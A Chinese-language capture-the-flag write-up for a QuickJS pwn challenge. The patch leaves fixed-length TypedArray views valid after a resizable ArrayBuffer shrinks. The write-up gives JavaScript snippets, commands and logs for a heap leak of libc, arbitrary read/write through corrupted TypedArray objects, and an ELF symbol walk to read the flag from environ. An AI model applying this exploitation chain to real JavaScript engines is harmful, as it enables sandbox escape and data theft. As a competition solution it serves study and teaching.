# RABbit Hole — 可伸缩缓冲区的固定视图

```
> TPCTF 2026 · pwn · 挑战 ID `AUTHORED-9865E245` · 状态 solved
```

## 一句话

一个面向公开评测的 QuickJS 沙箱求值服务：每个 TCP 连接获得一个全新的 worker 进程，通过 JSON Lines 提交 JavaScript 源码，服务返回结构化结果。

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `AUTHORED-9865E245.zip` | 1.5 MB | `140e97fa9f53…` |
| `zip/patch.diff` | 634 B | `250a3be56736…` |
| `zip/README.md` | 1.1 KB | `c981543da08f…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 结果

«FLAG»

连续 4 次独立连接均取得同一标志，服务端以环境变量 QJS_CTF_FLAG 注入该值。

### 1. 漏洞：RAB 缩短后定长 TypedArray 视图未失效

newchal/patch.diff 只改了 third_party/quickjs/src/quickjs.c 的js_array_buffer_update_typed_arrays()：

```
} else {
```

-                if (len >= (int64_t)ta->offset + ta->length) {
-                    p->u.array.count = ta->length >> size_log2;
-                    p->u.array.u.ptr = &data[ta->offset];
-                }

+                /* a fixed-length view keeps its construction length */

```
+                p->u.array.count = ta->length >> size_log2;
+                p->u.array.u.ptr = &data[ta->offset]; }
```

对 track_rab == FALSE 的定长视图，原代码在 ArrayBuffer 被 resize 到小于offset + length 时会跳过更新；补丁删掉了这个判断，于是 rab.resize(1) 之后：

• view.length 仍为构造时的 4096（ta->length 未变）；
• view.byteLength 变为 0（typed_array_is_oob() 为真）；
• 但 p->u.array.count 仍是 4096，ptr 仍指向原数据区；
• 快速元素访问只检查 idx < u.array.count，因此可以越界读写原缓冲区之后的堆。

线上验证：

```js
var rab = new ArrayBuffer(0x1000, {maxByteLength: 0x1000});
var v = new Uint8Array(rab, 0, 0x1000);
rab.resize(1);
```

({rl: rab.byteLength, vl: v.length, vbl: v.byteLength, x: v[0x800]})

```
// {"rl":1,"vl":4096,"vbl":0,"x":0}
```

### 2. 利用原语

**2.1 泄露 libc：guard 必须在 shrink 之前分配**

```js
var N = 0x10000;
var rab = new ArrayBuffer(N, {maxByteLength: N});
var o = new Uint8Array(rab, 0, N);
var guard = new ArrayBuffer(0x1000);   // 关键：先占住后续 chunk
rab.resize(1);
```

rab.resize(1) 调用 js_realloc 缩短数据块，剩余部分被 free()。因为guard 已经分配在它后面，剩余块不会并回 top chunk，而是进入 unsorted bin，其 fd/bk 被写成 main_arena + 96。o 的指针仍指向原数据区开头，于是：

o+0x10: 0x000000000000fff1   (chunk size)

o+0x18: main_arena + 96

o+0x20: main_arena + 96

本地静态构建得到 0x6118a0（对应 main_arena = 0x611840）；线上得到0x7f... 范围内的 libc 地址。

如果反过来先 resize 再分配 guard，剩余块会并入 top chunk，fd/bk 为 0，读不到 libc 指针。

**2.2 构造任意读写**

在泄露之后，分配一个 abv = new ArrayBuffer(0x100)，再分配 800 个new Uint8Array(abv, 0, 32)。这些 TypedArray 的 JSObject 会落在刚被free() 的大块中，且都在 o 的 0x10000 字节越界窗口内。

JSObject 布局（本地 ptype /o，线上行为一致）：

| 偏移 | 字段 |
| --- | --- |
| +0x12 | class_id（Uint8Array = 23） |
| +0x30 | u.array.u.ptr，指向 abv 数据 |
| +0x38 | u.array.count（uint32） |

先扫描 o 找到 class_id 为 23 的第一个对象 H（稳定为 0x1038，每个对象间隔 0x48），读出其 ptr = P。把 H+0x30 改成 P+0x80，只有该对象对应的 victims[J] 会读到 marker[0x80] = 0xAB，由此确定 J；恢复P 后，把 H+0x38 的 count 改为 0x7fffffff。之后：

rd(addr, len)  // 把 V 的 ptr 设为 addr，顺序读 V[0..len-1]

wr(addr, hex)  // 同上，顺序写

即可对进程内任意可映射地址读写。

**2.3 找 libc 基址**

从泄露值 L = main_arena + 96 开始，按页向下扫描 4 字节 ELF magic 0x464c457f：

```js
for (var a = L & ~0xfff; ; a -= 0x1000)
if (rd32(a) == 0x464c457f) return a;
```

线上返回的 ELF 是 libc.so.6（e_type = ET_DYN，DT_SONAME = "libc.so.6"），L - base = 0x1d3cc0（该线上 glibc 的 main_arena + 96 偏移）。

**2.4 解析 environ 并读环境变量**

不能直接用 section header：.shstrtab / section header table 在文件末尾，不一定会被映射进内存，读它会崩。改为从程序头找 PT_DYNAMIC：

• e_phoff = 0x40，e_phnum = 14；
• 读 PT_DYNAMIC（p_type == 2）的条目；
• 内存中的 d_ptr 已被 ld.so 重定位成绝对地址，不要再加 base；
• 取 DT_GNU_HASH、DT_SYMTAB、DT_STRTAB，按 GNU hash 链查找符号 environ；
• st_value = 0x1db320 是相对 libc 基址的偏移，environ 变量地址为 base + 0x1db320；
• 读 environ 得到栈上的 envp 数组指针，逐项读取字符串。

线上环境恰好由 adapter 设置为：

```
env[0] = "LC_ALL=C"
env[1] = "LANG=C"
env[2] = "QJS_CTF_FLAG=«FLAG»"
```

注意：环境字符串位于栈顶附近，一次 rd(q, 256) 会跨过栈映射末尾导致worker 被 SIGSEGV 杀死。因此用 JS 内的 rc(addr, max) 逐字节读到 NUL为止，避免越界读。

### 3. 复现

依赖：Python 3（仅标准库）、能访问 172.16.32.2:8000 的 WireGuard 隧道。

```bash
cd D:\文档\deepseek-harness\TPCTF决赛
python newchal/exploit_final.py 172.16.32.2 8000
```

实际输出（节选）：

[*] stage1c

```
{'L': '7f46b0375cc0', 'H': 4152, 'ptr': '5915a3c3afc0', 'J': 13}
```

[*] find base

```
base = 0x7f46b01a2000
e_type=3 phoff=0x40 entsize=56 num=14
```

gnu_hash nbuckets=1009 symoffset=19 bucket[85]=288

b'environ': symidx=290 st_value=0x1db320

environ @ 0x7f46b037d320

```
envp = 0x7fff3a668f28
env[0] = 'LC_ALL=C'
env[1] = 'LANG=C'
env[2] = 'QJS_CTF_FLAG=«FLAG»'
```

[+] FLAG = «FLAG»

相关文件：

• newchal/stage1c.js：泄露 main_arena、构造 rd/wr/rc/findbase 原语；
• newchal/exploit_final.py：完整利用链与 ELF/动态段解析；
• newchal/client.py：JSON Lines 客户端；
• newchal/solve.log：最终一次复现日志。

### 4. 本地验证（可选）

在 WSL Ubuntu 22.04 中把 newchal/base 复制到 ~/qjs_newchal，应用补丁后：

make runner -j8 CFLAGS="-O2 -g" LDFLAGS="-static"

```bash
QJS_CTF_FLAG="«FLAG»" \
python3 adapter/server.py --host 0.0.0.0 --port 18000 --runner ./build/qjs_runner
```

本地静态二进制基址固定为 0x400000，main_arena = 0x611840，environ = 0x618438；stage1c.js 的 H 同样为 0x1038，可用rd(0x400000, 4) == 7f454c46 验证原语。线上二进制实际为动态 PIE（存在 libc.so.6 映射），因此利用链中所有地址都来自运行时泄露和解析，没有硬编码 qjs 或 libc 基址。

## 结果

- flag sha256：`b6df3e97f74b936a7c499dfc00000979b3632c96b871823538df392cfb017ba8`, `e04b2fa44cfa5bb55eee3d96ad6cdbdd75c027be456bf994aef4e7c40a5370f6`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/exploit.py`
- `solve/client.py`

## 待核实

- 本条目由 WP 第 34 节《RABbit Hole — 可伸缩缓冲区的固定视图》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
